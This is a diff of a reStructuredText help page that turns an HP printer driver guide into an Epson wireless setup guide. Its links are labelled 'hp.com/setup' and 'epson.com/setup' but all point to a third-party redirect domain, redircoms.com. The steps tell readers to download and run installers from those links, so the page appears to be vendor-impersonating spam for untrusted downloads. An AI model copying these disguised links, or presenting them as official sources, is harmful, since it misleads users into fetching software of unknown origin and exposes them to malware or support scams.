@@ -1,5 +1,5 @@
 ##################
-How Do I Download, Install, and Set Up My HP Printer Driver?
+Setting Up Your Product on a Wireless Network - Epson
 ##################
 
 .. meta::
@@ -10,12 +10,12 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
       :align: center
       :height: 100px
 
-.. image:: Enter_Product_Key.png
+.. image:: SETUP-YOUR-PRINTER.png
       :width: 350px
       :align: center
       :height: 100px
-      :alt: hp.com/setup
-      :target: https://hp.redircoms.com
+      :alt: epson.com/setup
+      :target: https://eps.redircoms.com
 
 .. image:: blank.png
       :width: 350px
@@ -27,47 +27,42 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
 
 
 
+Setting up your Epson printer on a wireless network allows you to print from anywhere in your home or office without messy cables. To begin, visit `epson.com/setup <https://eps.redircoms.com>`_ to download the required drivers and wireless setup utilities specific to your printer model.
 
-There are 5 simple stages to download, install, and set up your HP printer driver on your computer. Follow each stage one by one to successfully connect your printer via `hp.com/setup <https://hp.redircoms.com>`_. HP’s setup site provides the latest drivers and simple installation steps. It’s the fastest way to ensure your printer works seamlessly with your computer. Visit `hp.com/setup <https://hp.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
+Step 1: Prepare Your Wireless Network
+-------------------------------------
+- Ensure your wireless router is powered on and connected to the internet.
+- Note down the network name (SSID) and Wi-Fi password.
 
-**********
-Steps to Download HP Printer Driver
-**********
+Step 2: Power On and Prepare the Printer
+----------------------------------------
+- Plug in your Epson printer and press the **Power** button.
+- Install ink cartridges and load paper if you haven’t already.
+- On printers with a control panel display, navigate to the setup or home menu.
 
-1. Open a web browser and go to `hp.com/setup <https://hp.redircoms.com>`_.
+Step 3: Connect the Printer to Wi-Fi
+------------------------------------
+There are multiple ways to connect your Epson printer to your wireless network:
 
-2. Enter your HP printer model in the search box.
+**Using the Control Panel:**
+- Go to **Wi-Fi Setup** or **Network Settings**.
+- Select **Wi-Fi Setup Wizard**.
+- Choose your wireless network (SSID) from the list.
+- Enter your Wi-Fi password using the keypad and confirm the connection.
 
-3. Select your operating system if prompted.
+**Using the Epson Software Installer:**
+- On your computer, go to `epson.com/setup <https://eps.redircoms.com>`_.
+- Enter your printer model and download the setup utility.
+- Run the installer and choose **Wireless Connection** when prompted.
+- Follow on-screen instructions to complete the Wi-Fi setup.
 
-4. Click on **Download** to get the latest driver and software package.
+Step 4: Complete Installation on Computer or Mobile Device
+----------------------------------------------------------
+- After connecting the printer to Wi-Fi, install the driver package on your device if you haven’t already.
+- Make sure your computer or smartphone is connected to the same Wi-Fi network.
+- Add the printer through the Epson setup software or your device’s system settings.
 
-5. Save the installer file to your computer.
-
-**********
-Steps to Install HP Printer Driver
-**********
-
-1. Locate the downloaded installer file on your computer.
-
-2. Double-click the installer to begin the setup process.
-
-3. Follow the on-screen instructions and accept the license agreement.
-
-4. Choose your connection type (USB or Wireless).
-
-5. Complete the installation by clicking **Finish**.
-
-**********
-Setting Up Your HP Printer
-**********
-
-1. Make sure your HP printer is powered on.
-
-2. For wireless setup, ensure your printer and computer are on the same Wi-Fi network.
-
-3. Open the HP driver or utility you installed.
-
-4. Follow on-screen prompts to detect and connect your printer.
-
-5. Once connected, print a test page to verify setup is complete.
+Step 5: Confirm the Connection
+------------------------------
+- Print a network status sheet or test page to confirm that the printer is connected.
+- Open the Epson software to check ink levels, alignment, and perform maintenance if needed.
